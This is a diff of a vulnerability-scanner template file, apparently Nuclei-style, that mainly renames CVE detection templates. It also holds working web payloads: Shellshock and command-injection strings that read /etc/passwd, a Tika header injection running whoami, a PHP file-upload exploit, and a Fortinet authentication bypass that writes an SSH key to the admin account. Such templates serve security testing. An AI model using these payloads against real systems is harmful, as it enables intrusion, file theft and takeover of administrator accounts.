@@ -1801,7 +1801,7 @@
     {
       "id": "CVE-2010-2033",
       "info": {
-        "name": "Joomla Percha Categories Tree 0.6 - Local File Inclusion",
+        "name": "Joomla! Percha Categories Tree 0.6 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3948,7 +3948,7 @@
     {
       "id": "CVE-2015-4074",
       "info": {
-        "name": "Joomla Helpdesk Pro plugin <1.4.0 - Local File Inclusion",
+        "name": "Joomla! Helpdesk Pro plugin <1.4.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4791,7 +4791,7 @@
     {
       "id": "CVE-2016-10368",
       "info": {
-        "name": "Opsview Monitor Pro 4.5.x - Open Redirect",
+        "name": "Opsview Monitor Pro - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -5263,7 +5263,7 @@
     {
       "id": "CVE-2017-11586",
       "info": {
-        "name": "FineCms < 5.0.9 - Open redirect",
+        "name": "FineCMS <5.0.9 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -6704,7 +6704,7 @@
     {
       "id": "CVE-2018-12675",
       "info": {
-        "name": "SV3C HD Camera L-SERIES - Open Redirect",
+        "name": "SV3C HD Camera L Series - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -6863,7 +6863,7 @@
     {
       "id": "CVE-2018-14474",
       "info": {
-        "name": "OrangeForum 1.4.0 - Open Redirect",
+        "name": "Orange Forum 1.4.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -6879,7 +6879,7 @@
     {
       "id": "CVE-2018-14574",
       "info": {
-        "name": "Django Open Redirect",
+        "name": "Django - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -7225,7 +7225,7 @@
     {
       "id": "CVE-2018-16761",
       "info": {
-        "name": "Eventum v3.3.4 - Open Redirect",
+        "name": "Eventum <3.4.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -7299,7 +7299,7 @@
     {
       "id": "CVE-2018-17422",
       "info": {
-        "name": "dotCMS < 5.0.2 - Open Redirect",
+        "name": "dotCMS <5.0.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -7496,7 +7496,7 @@
     {
       "id": "CVE-2018-19287",
       "info": {
-        "name": "Ninja Forms <= 3.3.17 - Cross-Site Scripting",
+        "name": "WordPress Ninja Forms <3.3.18 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8087,7 +8087,7 @@
     {
       "id": "CVE-2018-6200",
       "info": {
-        "name": "vBulletin 3.x.x & 4.2.x - Open Redirect",
+        "name": "vBulletin - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -8511,7 +8511,7 @@
     {
       "id": "CVE-2019-1010290",
       "info": {
-        "name": "Babel - Open Redirection",
+        "name": "Babel - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -8937,7 +8937,7 @@
     {
       "id": "CVE-2019-14223",
       "info": {
-        "name": "Alfresco Share Open Redirect",
+        "name": "Alfresco Share - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -9610,7 +9610,7 @@
     {
       "id": "CVE-2019-18957",
       "info": {
-        "name": "Microstrategy Library before 11.1.3 XSS",
+        "name": "MicroStrategy Library <11.1.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9998,7 +9998,7 @@
     {
       "id": "CVE-2019-3912",
       "info": {
-        "name": "LabKey Server < 18.3.0 - Open Redirect",
+        "name": "LabKey Server Community Edition <18.3.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -10199,7 +10199,7 @@
     {
       "id": "CVE-2019-7275",
       "info": {
-        "name": "Open Redirect in Optergy Proton/Enterprise BMS",
+        "name": "Optergy Proton/Enterprise Building Management System - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -10484,7 +10484,7 @@
     {
       "id": "CVE-2019-9915",
       "info": {
-        "name": "GetSimpleCMS 3.3.13 - Open Redirection",
+        "name": "GetSimple CMS 3.3.13 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -11322,7 +11322,7 @@
     {
       "id": "CVE-2020-15129",
       "info": {
-        "name": "Open-redirect in Traefik",
+        "name": "Traefik - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -11601,7 +11601,7 @@
     {
       "id": "CVE-2020-17526",
       "info": {
-        "name": "Apache Airflow < 1.10.14 - Authentication Bypass",
+        "name": "Apache Airflow <1.10.14 - Authentication Bypass",
         "severity": "high"
       },
       "requests": [
@@ -11631,7 +11631,7 @@
     {
       "id": "CVE-2020-18268",
       "info": {
-        "name": "Z-BlogPHP 1.5.2 - Open Redirect",
+        "name": "Z-Blog <=1.5.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -11751,7 +11751,7 @@
     {
       "id": "CVE-2020-20285",
       "info": {
-        "name": "zzcms - Reflected XSS",
+        "name": "ZZcms - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -11863,8 +11863,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -11952,7 +11952,7 @@
     {
       "id": "CVE-2020-22840",
       "info": {
-        "name": "b2evolution CMS - Open Redirect",
+        "name": "b2evolution CMS <6.11.6 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -11967,7 +11967,7 @@
     {
       "id": "CVE-2020-23015",
       "info": {
-        "name": "OPNsense 20.1.5. Open Redirect",
+        "name": "OPNsense <=20.1.5 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -12104,7 +12104,7 @@
     {
       "id": "CVE-2020-24550",
       "info": {
-        "name": "EpiServer <13.2.7 - Open Redirect",
+        "name": "EpiServer Find <13.2.7 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -12309,9 +12309,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -13033,7 +13033,7 @@
     {
       "id": "CVE-2020-36365",
       "info": {
-        "name": "Smartstore < 4.1.0 - Open Redirect",
+        "name": "Smartstore <4.1.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -13665,7 +13665,7 @@
     {
       "id": "CVE-2020-8772",
       "info": {
-        "name": "WordPress InfiniteWP Client < 1.9.4.5 - Authentication Bypass",
+        "name": "WordPress InfiniteWP <1.9.4.5 - Authorization Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -13979,7 +13979,7 @@
     {
       "id": "CVE-2021-20031",
       "info": {
-        "name": "Sonicwall SonicOS 7.0 - Host Header Injection",
+        "name": "SonicWall SonicOS 7.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -14627,7 +14627,7 @@
     {
       "id": "CVE-2021-22873",
       "info": {
-        "name": "Revive Adserver < 5.1.0 Open Redirect",
+        "name": "Revive Adserver <5.1.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -14647,7 +14647,7 @@
     {
       "id": "CVE-2021-22911",
       "info": {
-        "name": "RocketChat - NoSQL injection",
+        "name": "Rocket.Chat <=3.13 - NoSQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14720,7 +14720,7 @@
     {
       "id": "CVE-2021-24165",
       "info": {
-        "name": "Ninja Forms < 3.4.34 - Administrator Open Redirect",
+        "name": "WordPress Ninja Forms <3.4.34 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -14750,7 +14750,7 @@
     {
       "id": "CVE-2021-24210",
       "info": {
-        "name": "PhastPress < 1.111 - Open Redirect",
+        "name": "WordPress PhastPress <1.111 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -14962,7 +14962,7 @@
     {
       "id": "CVE-2021-24288",
       "info": {
-        "name": "AcyMailing < 7.5.0 - Open Redirect",
+        "name": "WordPress AcyMailing <7.5.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -15334,7 +15334,7 @@
     {
       "id": "CVE-2021-24838",
       "info": {
-        "name": "AnyComment < 0.3.5 - Open Redirect",
+        "name": "WordPress AnyComment <0.3.5 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -15410,7 +15410,7 @@
     {
       "id": "CVE-2021-24940",
       "info": {
-        "name": "Persian Woocommerce < 5.9.8 - Cross-Site Scripting",
+        "name": "WordPress Persian Woocommerce <=5.8.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15635,7 +15635,7 @@
     {
       "id": "CVE-2021-25111",
       "info": {
-        "name": "English WordPress Admin < 1.5.2 - Unauthenticated Open Redirect",
+        "name": "WordPress English Admin <1.5.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -16080,7 +16080,7 @@
     {
       "id": "CVE-2021-27909",
       "info": {
-        "name": "Mautic - Cross-Site Scripting",
+        "name": "Mautic <3.3.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16340,15 +16340,15 @@
     {
       "id": "CVE-2021-29490",
       "info": {
-        "name": "Jellyfin 10.7.2 SSRF",
+        "name": "Jellyfin 10.7.2 - SSRF",
         "severity": "medium"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/Images/Remote?imageUrl=http://{{interactsh-url}}",
-            "{{BaseURL}}/Items/RemoteSearch/Image?ImageUrl=http://{{interactsh-url}}&ProviderName=TheMovieDB"
+            "{{BaseURL}}/Images/Remote?imageUrl=http://interact.sh/",
+            "{{BaseURL}}/Items/RemoteSearch/Image?ImageUrl=http://interact.sh/&ProviderName=TheMovieDB"
           ]
         }
       ]
@@ -16356,7 +16356,7 @@
     {
       "id": "CVE-2021-29622",
       "info": {
-        "name": "Prometheus v2.23.0 to v2.26.0, and v2.27.0 Open Redirect",
+        "name": "Prometheus  - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -16750,7 +16750,7 @@
     {
       "id": "CVE-2021-32618",
       "info": {
-        "name": "Flask Open Redirect",
+        "name": "Python Flask-Security - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -17300,7 +17300,7 @@
     {
       "id": "CVE-2021-3654",
       "info": {
-        "name": "noVNC Open Redirect",
+        "name": "Nova noVNC - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -18076,7 +18076,7 @@
     {
       "id": "CVE-2021-41432",
       "info": {
-        "name": "FlatPress 1.2.1 - Cross-site scripting",
+        "name": "FlatPress 1.2.1 - Stored Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -19309,7 +19309,7 @@
     {
       "id": "CVE-2022-0412",
       "info": {
-        "name": "TI WooCommerce Wishlist WP plugin < 1.40.1 - SQL Injection",
+        "name": "WordPress TI WooCommerce Wishlist <1.40.1 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19412,7 +19412,7 @@
     {
       "id": "CVE-2022-0535",
       "info": {
-        "name": "E2Pdf < 1.16.45 - Cross-Site Scripting",
+        "name": "WordPress E2Pdf <1.16.45 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -19578,7 +19578,7 @@
     {
       "id": "CVE-2022-0679",
       "info": {
-        "name": "Narnoo Distributor <= 2.5.1 - Unauthenticated LFI to Arbitrary File Read / RCE",
+        "name": "WordPress Narnoo Distributor <=2.5.1 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -19622,7 +19622,7 @@
     {
       "id": "CVE-2022-0781",
       "info": {
-        "name": "Nirweb support < 2.8.2 - Unauthenticated SQLi",
+        "name": "WordPress Nirweb Support <2.8.2 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19897,6 +19897,21 @@
       ]
     },
     {
+      "id": "CVE-2022-1574",
+      "info": {
+        "name": "HTML2WP <= 1.0.0 - Unauthenticated Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin.php?page=html2wp-settings HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 253\nContent-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990\nConnection: close\n\n-----------------------------7816508136577551742878603990\nContent-Disposition: form-data; name=\"local_importing[]\"; filename=\"{{randstr}}.php\"\nContent-Type: text/html\n\n<?php\n\necho \"File Upload success\";\n\n-----------------------------7816508136577551742878603990--\n",
+            "GET /wp-content/uploads/html2wp/{{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1597",
       "info": {
         "name": "WordPress WPQA <5.4 - Cross-Site Scripting",
@@ -19972,7 +19987,7 @@
     {
       "id": "CVE-2022-1768",
       "info": {
-        "name": "RSVPMaker WordPress plugin <= 9.3.2 - SQL Injection",
+        "name": "WordPress RSVPMaker <=9.3.2 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -20029,7 +20044,7 @@
     {
       "id": "CVE-2022-1910",
       "info": {
-        "name": "Shortcodes and extra features for Phlox theme < 2.9.8 - Cross-Site-Scripting",
+        "name": "WordPress Shortcodes and Extra Features for Phlox <2.9.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -20521,7 +20536,7 @@
     {
       "id": "CVE-2022-2467",
       "info": {
-        "name": "SourceCodester Garage Management System 1.0 - SQL Injection",
+        "name": "Garage Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -21138,7 +21153,7 @@
     {
       "id": "CVE-2022-29272",
       "info": {
-        "name": "Nagios XI < 5.8.5 - Open Redirect",
+        "name": "Nagios XI <5.8.5 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -21287,7 +21302,7 @@
     {
       "id": "CVE-2022-29775",
       "info": {
-        "name": "iSpyConnect iSpy v7.2.2.0 - Improper Authentication",
+        "name": "iSpy 7.2.2.0 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -21348,7 +21363,7 @@
     {
       "id": "CVE-2022-30513",
       "info": {
-        "name": "School Dormitory Management - Authenticated XSS",
+        "name": "School Dormitory Management System 1.0 - Authenticated Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -21363,7 +21378,7 @@
     {
       "id": "CVE-2022-30514",
       "info": {
-        "name": "School Dormitory Management -  Authenticated XSS via \"s=\" parameter",
+        "name": "School Dormitory Management System 1.0 - Authenticated Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -22104,7 +22119,7 @@
     {
       "id": "CVE-2022-35914",
       "info": {
-        "name": "GLPI - Remote Code Execution",
+        "name": "GLPI <=10.0.2 - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -22223,7 +22238,7 @@
     {
       "id": "CVE-2022-38553",
       "info": {
-        "name": "Academy Learning Management System < v5.9.1 - Reflected XSS",
+        "name": "Academy Learning Management System <5.9.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -22298,7 +22313,7 @@
     {
       "id": "CVE-2022-40083",
       "info": {
-        "name": "Labstack Echo < v4.9.0 - Open Redirect",
+        "name": "Labstack Echo 4.8.0 - Open Redirect",
         "severity": "critical"
       },
       "requests": [
@@ -22313,14 +22328,14 @@
     {
       "id": "CVE-2022-40684",
       "info": {
-        "name": "Fortigate - Authentication bypass",
+        "name": "Fortinet - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
             "GET /api/v2/cmdb/system/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Node.js\nForwarded: by=\"[127.0.0.1]:1337\";for=\"[127.0.0.1]:1337\";proto=http;host=\nX-Forwarded-Vdom: root\n",
-            "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\nContent-Length: 610\n\n{\n   \"ssh-public-key1\":\"{{randstr}}\"\n}\n"
+            "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\nContent-Length: 610\n\n {\n  \"ssh-public-key1\":\"{{randstr}}\"\n}\n"
           ]
         }
       ]
@@ -22344,7 +22359,7 @@
     {
       "id": "CVE-2022-41473",
       "info": {
-        "name": "RPCMS 3.0.2 - Cross-site scripting (XSS)",
+        "name": "RPCMS 3.0.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
